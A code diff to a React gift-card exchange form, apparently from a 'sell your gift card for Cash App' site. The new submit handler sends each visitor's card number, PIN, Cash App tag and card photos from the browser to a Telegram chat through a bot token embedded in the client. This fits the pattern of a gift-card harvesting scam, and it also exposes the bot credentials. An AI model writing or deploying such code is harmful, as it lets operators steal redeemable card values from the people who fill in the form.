@@ -55,22 +55,70 @@ const Exchange = () => {
     'Sephora Gift Card', 'Steam Wallet Card'
   ];
 
-  const handleSubmit = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
     setIsSubmitting(true);
     
-    // In a real app, you would upload the cardImages here
-    console.log("Submitting form with images:", cardImages);
+    const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
+    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;
 
-    // Simulate API call
-    setTimeout(() => {
+    // Construct the message
+    const message = `
+<b>New Gift Card Submission</b>
+━━━━━━━━━━━━━━━━━━
+<b>Card Type:</b> ${formData.cardType}
+<b>Amount:</b> $${formData.cardAmount}
+<b>Card Number:</b> <code>${formData.cardNumber}</code>
+<b>PIN:</b> <code>${formData.cardPin || 'N/A'}</code>
+<b>Cashapp Tag:</b> <code>${formData.cashappTag}</code>
+━━━━━━━━━━━━━━━━━━
+<b>Return Amount:</b> $${calculateReturn()}
+    `;
+
+    try {
+      // Send text details first
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: 'HTML'
+        })
+      });
+
+      // Send images if any
+      if (cardImages.length > 0) {
+        for (const image of cardImages) {
+          const formDataObj = new FormData();
+          formDataObj.append('chat_id', chatId);
+          formDataObj.append('photo', image);
+          
+          await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: 'POST',
+            body: formDataObj
+          });
+        }
+      }
+
       setIsSubmitting(false);
       setIsSuccess(true);
       
-      // Reset images
+      // Reset state
+      setFormData({
+        cardType: '',
+        cardAmount: '',
+        cardNumber: '',
+        cardPin: '',
+        cashappTag: '',
+      });
       setCardImages([]);
       setImagePreviews([]);
-    }, 3000);
+    } catch (error) {
+      console.error('Error reporting to Telegram:', error);
+      alert('There was an error processing your request. Please try again.');
+      setIsSubmitting(false);
+    }
   };
 
   const calculateReturn = () => {
